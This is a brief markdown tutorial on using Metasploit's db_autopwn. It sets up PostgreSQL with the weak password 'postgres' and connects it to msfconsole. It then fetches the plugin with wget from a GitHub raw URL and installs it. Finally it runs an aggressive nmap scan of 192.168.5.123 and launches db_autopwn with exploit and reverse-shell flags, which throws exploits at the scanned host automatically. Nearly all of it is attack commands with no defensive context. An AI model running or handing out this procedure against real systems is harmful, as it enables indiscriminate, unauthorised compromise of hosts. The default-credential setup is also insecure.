### 1. setup postgresql

```
service postgresql start
sudo -u postgres psql postgres
postgres=# alter user postgres with password 'postgres';
postgres=# \password postgres
postgres=# \q
```

### 2. connect postgres

```
msf> db_disconnect
msf> db_connect postgres:postgres@127.0.0.1/postgres
msf> db_status
```

### 3. install db_autopwn

```
msf> load db_autopwn
[-] Failed to load plugin from /opt/metasploit-framework/embedded/framework/plugins/db_autopwn
wget https://raw.githubusercontent.com/hahwul/metasploit-autopwn/master/db_autopwn.rb
cp db_autopwn.rb /opt/metasploit-framework/embedded/framework/plugins/
msf> load db_autopwn
[*] Successfully loaded plugin: db_autopwn
```

### 4. use db_autopwn

```
msf> db_nmap -sV -O -v -T 5 192.168.5.123
msf> db_autopwn  -e  -t  -r  -p
```

### Reference
```
https://github.com/hahwul/metasploit-autopwn/blob/master/README.md
http://www.cnblogs.com/zlslch/p/6881649.html
```
